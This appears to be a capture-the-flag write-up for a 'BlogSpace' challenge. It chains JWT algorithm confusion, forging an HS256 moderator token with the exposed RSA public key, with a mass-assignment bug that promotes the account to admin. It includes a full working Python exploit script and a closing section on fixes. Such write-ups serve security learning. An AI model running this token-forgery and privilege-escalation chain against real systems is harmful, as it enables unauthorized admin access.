# BlogSpace Admin Privilege Escalation

This challenge chains two bugs:

1. JWT algorithm confusion
2. Mass assignment in the profile update endpoint

The JWT bug lets us forge a moderator token, and the mass assignment bug lets that moderator token turn the current account into an admin.

## Recon

After logging in as a normal user, the app gives us a JWT from:

```text
GET /api/token
```

Changing this token alone does not give access to normal admin pages because the website still uses the Flask session for browser authentication.

While checking API routes, I found:

```text
POST /api/profile/update
```

Without the correct JWT role, it responds with:

```json
{
  "error": "Forbidden - moderator JWT required"
}
```

This means the endpoint checks the role inside the JWT.

The app also exposes its RSA public key:

```text
GET /static/jwt_pub.pem
```

## JWT algorithm confusion

The legitimate tokens use `RS256`.

With `RS256`, the server should verify the JWT using the RSA public key. The problem is that the backend also accepts `HS256`.

When `HS256` is used, the server treats the same RSA public key bytes as an HMAC secret.

Since the public key is available to everyone, we can use it to sign our own token.

The forged header is:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The payload gives the current account a moderator role:

```json
{
  "sub": 7050,
  "username": "tester12345",
  "role": "moderator",
  "iat": 1783384216,
  "exp": 1783470616
}
```

The `sub` value has to match the real user ID. I got it by decoding the legitimate JWT from `/api/token`.

## Mass assignment

The forged moderator token gives access to:

```text
POST /api/profile/update
```

The endpoint accepts profile data as JSON, but it does not limit which fields can be updated.

This lets us include privileged fields such as:

```json
{
  "bio": "promoted",
  "role": "admin",
  "is_admin": 1,
  "is_moderator": 1
}
```

The server writes those fields directly to the current user's database record.

A successful response looks like:

```json
{
  "success": true,
  "user": {
    "id": 7050,
    "username": "tester12345",
    "is_admin": 1,
    "is_moderator": 1
  }
}
```

The existing Flask session now belongs to an admin account, so refreshing the site gives access to:

```text
/dashboard
/admin/notes
```

## Exploit

```python
import base64
import hashlib
import hmac
import json
import time

import requests


BASE = "http://51.79.140.18:30303"
USERNAME = "tester12345"
PASSWORD = "Passw0rd!"


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_hs256_jwt(payload: dict, secret: bytes) -> str:
    header = {
        "alg": "HS256",
        "typ": "JWT",
    }

    encoded_header = b64u(
        json.dumps(header, separators=(",", ":")).encode()
    )

    encoded_payload = b64u(
        json.dumps(payload, separators=(",", ":")).encode()
    )

    message = f"{encoded_header}.{encoded_payload}".encode()

    signature = hmac.new(
        secret,
        message,
        hashlib.sha256,
    ).digest()

    return (
        f"{encoded_header}."
        f"{encoded_payload}."
        f"{b64u(signature)}"
    )


session = requests.Session()

# Log in as a normal user.
response = session.post(
    f"{BASE}/login",
    data={
        "username": USERNAME,
        "password": PASSWORD,
    },
    allow_redirects=False,
)

print("[+] login:", response.status_code)

# Get the real user ID from the legitimate JWT.
response = session.get(f"{BASE}/api/token")
legitimate_token = response.json()["token"]

payload_b64 = legitimate_token.split(".")[1]
payload_b64 += "=" * (-len(payload_b64) % 4)

claims = json.loads(
    base64.urlsafe_b64decode(payload_b64)
)

user_id = claims["sub"]

print("[+] uid:", user_id)

# Download the exposed RSA public key.
public_key = session.get(
    f"{BASE}/static/jwt_pub.pem"
).content

# Forge an HS256 moderator token using the public key
# as the HMAC secret.
now = int(time.time())

forged_token = forge_hs256_jwt(
    {
        "sub": user_id,
        "username": USERNAME,
        "role": "moderator",
        "iat": now,
        "exp": now + 86400,
    },
    public_key,
)

# Use mass assignment to promote the account.
response = session.post(
    f"{BASE}/api/profile/update",
    headers={
        "Authorization": f"Bearer {forged_token}"
    },
    json={
        "bio": "promoted",
        "role": "admin",
        "is_admin": 1,
        "is_moderator": 1,
    },
)

print(
    "[+] update:",
    response.status_code,
    response.text,
)

# Check that the current Flask session now belongs
# to an admin account.
response = session.get(f"{BASE}/profile")

print(
    "[+] admin badge:",
    "role-admin" in response.text,
)

response = session.get(f"{BASE}/dashboard")

print(
    "[+] dashboard:",
    response.status_code,
    "Moderator Dashboard" in response.text,
)
```

## How the chain works

The exploit relies on both bugs.

First, the exposed RSA public key is used as an HMAC secret to forge an `HS256` moderator token.

Then, that token is sent to the profile update endpoint with the fields:

```text
is_admin = 1
is_moderator = 1
role = admin
```

The account is updated in the database, and the existing browser session immediately gains admin access.

## Fix

The server should only accept the expected JWT algorithm:

```text
RS256
```

It should never allow the token header to choose between `RS256` and `HS256`.

The profile update endpoint should also use an allowlist of fields that normal users are allowed to change, such as:

```text
bio
display_name
avatar
```

Fields such as these should never be accepted from user-controlled JSON:

```text
role
is_admin
is_moderator
```